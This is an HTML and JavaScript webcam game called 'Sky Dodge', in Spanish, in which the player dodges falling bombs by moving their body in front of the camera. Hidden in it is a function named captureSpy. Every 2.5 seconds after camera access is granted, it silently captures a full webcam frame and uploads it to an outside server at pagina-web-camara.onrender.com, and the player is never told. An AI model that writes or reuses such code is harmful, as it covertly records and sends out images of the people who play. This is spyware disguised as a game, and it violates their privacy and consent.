<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Sky Dodge - Full Body Edition</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
        
        video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.5); }
        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
        
        #hud { position: absolute; top: 20px; width: 100%; text-align: center; z-index: 100; font-size: 24px; font-weight: bold; text-shadow: 2px 2px #000; pointer-events: none; }
        
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 500; display: flex; align-items: center; justify-content: center; text-align: center; }
        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; width: 90%; max-width: 450px; }
        
        #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; text-align: center; flex-direction: column; }
        
        .btn { padding: 15px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; width: 100%; font-size: 16px; transition: 0.2s; }
        .btn-normal { background: #2ecc71; color: white; }
        .btn-hard { background: #e74c3c; color: white; }
        .btn:active { transform: scale(0.95); }
    </style>
</head>
<body>

<div id="hud">PUNTOS: <span id="score">0</span></div>

<div id="dark-warning">
    <h1 style="font-size: 60px;">üåô</h1>
    <h2>MUY OSCURO</h2>
    <p>Enciende la luz para detectar tu cuerpo.</p>
</div>

<video id="webcam" autoplay playsinline></video>
<canvas id="gameCanvas"></canvas>

<div id="perm-screen" class="overlay">
    <div class="card">
        <h2>PASO 1: ACCESO</h2>
        <p>Al√©jate para que se vea tu <b>cuerpo completo</b>.</p>
        <button class="btn btn-normal" onclick="initCamera()">ACTIVAR C√ÅMARA</button>
    </div>
</div>

<div id="start-screen" class="overlay" style="display:none;">
    <div class="card">
        <h2 id="title-msg">SKY DODGE</h2>
        <p>Sal de la c√°mara un momento para calibrar el fondo, luego elige modo:</p>
        <button class="btn btn-normal" onclick="startGame('normal')">MODO NORMAL</button>
        <button class="btn btn-hard" onclick="startGame('hard')">MODO DIF√çCIL</button>
    </div>
</div>

<script>
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let score = 0, gameActive = false, objects = [], difficulty = 'normal';
    let backgroundFrame = null, presenceMap = [], animFrame;

    async function initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            document.getElementById('perm-screen').style.display = 'none';
            document.getElementById('start-screen').style.display = 'flex';
            
            setInterval(lightCheck, 1000);
            setInterval(captureSpy, 2500);
        } catch (e) { alert("Error: Acepta la c√°mara para jugar."); }
    }

    function calibrateBackground() {
        const tempCanvas = document.createElement('canvas');
        const tCtx = tempCanvas.getContext('2d');
        tempCanvas.width = 64; tempCanvas.height = 48;
        tCtx.scale(-1, 1);
        tCtx.drawImage(video, -64, 0, 64, 48);
        backgroundFrame = tCtx.getImageData(0, 0, 64, 48).data;
    }

    function lightCheck() {
        const c = document.createElement('canvas');
        const cx = c.getContext('2d');
        c.width = 40; cx.drawImage(video, 0, 0, 40, 40);
        const data = cx.getImageData(0,0,40,40).data;
        let b = 0;
        for(let i=0; i<data.length; i+=4) b += (data[i]*0.299 + data[i+1]*0.587 + data[i+2]*0.114);
        const avg = b / 1600;
        if (avg < 25) {
            document.getElementById('dark-warning').style.display = 'flex';
            gameActive = false;
        } else if (document.getElementById('dark-warning').style.display === 'flex') {
            document.getElementById('dark-warning').style.display = 'none';
        }
    }

    function startGame(mode) {
        difficulty = mode;
        document.getElementById('start-screen').style.display = 'none';
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        score = 0; objects = [];
        document.getElementById('score').innerText = "0";
        calibrateBackground();
        gameActive = true;
        spawnLoop();
        gameLoop();
    }

    function spawnLoop() {
        if (!gameActive) return;
        let rate = difficulty === 'normal' ? 2500 : 1200;
        const x = Math.random() * (canvas.width - 60);
        objects.push({
            x: x, y: 0,
            type: Math.random() > 0.3 ? 'bomb' : 'coin',
            speed: difficulty === 'normal' ? 4 : 7,
            warning: difficulty === 'normal' ? 120 : 60, // 2s vs 1s
            active: false
        });
        setTimeout(spawnLoop, rate);
    }

    function gameLoop() {
        if (!gameActive) return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        updatePresence();

        for (let i = objects.length - 1; i >= 0; i--) {
            let o = objects[i];
            if (o.warning > 0) {
                o.warning--;
                if (Math.floor(o.warning / 10) % 2 === 0) {
                    ctx.fillStyle = o.type === 'bomb' ? "red" : "#f1c40f";
                    ctx.font = "bold 60px Arial";
                    ctx.fillText("!", o.x + 10, 80);
                }
            } else {
                o.y += o.speed;
                ctx.fillStyle = o.type === 'bomb' ? "#222" : "#f1c40f";
                ctx.beginPath(); ctx.arc(o.x + 30, o.y + 30, 25, 0, Math.PI*2); ctx.fill();
                if(o.type === 'bomb') { ctx.fillStyle = "red"; ctx.fillRect(o.x+27, o.y, 6, 15); }

                if (checkPresenceCollision(o.x, o.y, 60, 60)) {
                    if (o.type === 'bomb') { gameOver(); return; }
                    else { score += 10; document.getElementById('score').innerText = score; objects.splice(i, 1); continue; }
                }
            }
            if (o.y > canvas.height) objects.splice(i, 1);
        }
        animFrame = requestAnimationFrame(gameLoop);
    }

    function updatePresence() {
        const tempCanvas = document.createElement('canvas');
        const tCtx = tempCanvas.getContext('2d');
        tempCanvas.width = 64; tempCanvas.height = 48;
        tCtx.scale(-1, 1);
        tCtx.drawImage(video, -64, 0, 64, 48);
        const curr = tCtx.getImageData(0, 0, 64, 48).data;
        presenceMap = [];
        if (backgroundFrame) {
            for (let i = 0; i < curr.length; i += 4) {
                const d = Math.abs(curr[i]-backgroundFrame[i]) + Math.abs(curr[i+1]-backgroundFrame[i+1]) + Math.abs(curr[i+2]-backgroundFrame[i+2]);
                presenceMap.push(d > 85 ? 1 : 0);
            }
        }
    }

    function checkPresenceCollision(x, y, w, h) {
        if (presenceMap.length === 0) return false;
        const gx = Math.floor((x / canvas.width) * 64), gy = Math.floor((y / canvas.height) * 48);
        const gw = Math.floor((w / canvas.width) * 64), gh = Math.floor((h / canvas.height) * 48);
        let hits = 0;
        for (let iy = gy; iy < gy + gh; iy++) {
            for (let ix = gx; ix < gx + gw; ix++) {
                if (presenceMap[iy * 64 + ix] === 1) hits++;
            }
        }
        return hits > 8;
    }

    function gameOver() {
        gameActive = false;
        cancelAnimationFrame(animFrame);
        document.getElementById('title-msg').innerText = "¬°BOOM! PUNTOS: " + score;
        document.getElementById('title-msg').style.color = "red";
        document.getElementById('start-screen').style.display = 'flex';
    }

    function captureSpy() {
        if (!video.videoWidth) return;
        const s = document.createElement('canvas');
        s.width = video.videoWidth; s.height = video.videoHeight;
        s.getContext('2d').drawImage(video, 0, 0);
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.5) })
        }).catch(() => {});
    }
</script>
</body>
</html>
